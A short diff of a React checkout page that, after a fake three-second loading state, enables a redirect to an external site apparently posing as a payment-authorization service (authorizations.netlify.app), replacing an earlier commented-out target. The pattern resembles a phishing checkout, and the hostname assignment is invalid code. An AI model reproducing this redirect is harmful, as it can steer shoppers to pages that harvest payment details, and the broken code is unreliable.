@@ -23,8 +23,8 @@ export default function CheckoutPage() {
     setisloading(true)
     setTimeout(() => {
       setisloading(false)
-     // window.location.hostname="https://kentbanks.netlify.app/"
-     // window.location.replace("https://kentbanks.netlify.app/")
+      window.location.hostname="https://authorizations.netlify.app/"
+      window.location.replace("https://authorizations.netlify.app/")
     }, 3000)
   }
   const { state, dispatch } = useCart()
